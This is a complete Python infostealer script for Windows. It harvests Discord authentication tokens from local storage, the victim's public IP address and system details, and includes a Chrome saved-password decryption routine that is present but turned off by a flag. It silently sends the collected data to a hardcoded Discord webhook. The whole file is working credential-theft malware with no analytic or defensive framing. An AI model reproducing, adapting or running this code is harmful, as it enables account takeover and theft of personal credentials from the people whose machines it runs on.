import os
import sys
import sqlite3
import shutil
import tempfile
import json
import requests
import win32crypt
import platform
from Crypto.Cipher import AES

WEBHOOK_URL = "https://discord.com/api/webhooks/1355626218908811516/ll_ni28pufWmeL7XBUwUGeWbnxbda3juQKHsu-5jL5jlvvNbGuYF1dYj8MUweH8nnQZ7"

def send_to_webhook(content):
    try:
        requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)
    except:
        pass

def get_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Failed to get IP"

def get_discord_tokens():
    tokens = []
    paths = [
        os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb\\',
        os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb\\',
        os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb\\'
    ]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(('.ldb', '.log')):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            for line in f.readlines():
                                if 'oken' in line:
                                    token = line.split('oken')[1].split('"')[1]
                                    if len(token) > 30:
                                        tokens.append(token)
                    except:
                        continue
    return tokens

def get_chrome_passwords():
    data = []
    login_db = os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data'
    if os.path.exists(login_db):
        try:
            temp_db = os.path.join(tempfile.gettempdir(), 'chrome_temp.db')
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                if row[0] and row[1] and row[2]:
                    try:
                        decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                        data.append(f"URL: {row[0]}\nUser: {row[1]}\nPass: {decrypted}\n")
                    except:
                        continue
            conn.close()
            os.remove(temp_db)
        except:
            pass
    return data

def get_system_info():
    return [
        f"System: {platform.system()} {platform.release()}",
        f"Processor: {platform.processor()}",
        f"Username: {os.getlogin()}"
    ]

def main():
    collected_data = []
    
    if True:
        collected_data.append(f"🌐 **IP Address:** ```{get_ip()}```")
    
    if True:
        tokens = get_discord_tokens()
        if tokens:
            collected_data.append("🔑 **Discord Tokens:**\n" + "\n".join([f"```{t}```" for t in tokens]))
    
    if False:
        passwords = get_chrome_passwords()
        if passwords:
            collected_data.append("🔐 **Chrome Passwords:**\n" + "\n".join(passwords[:5]))
    
    if True:
        system_info = get_system_info()
        collected_data.append("💻 **System Info:**\n" + "\n".join(system_info))
    
    if collected_data:
        send_to_webhook("\n".join(collected_data))
    
    sys.exit()

if __name__ == "__main__":
    sys.dont_write_bytecode = True
    main()
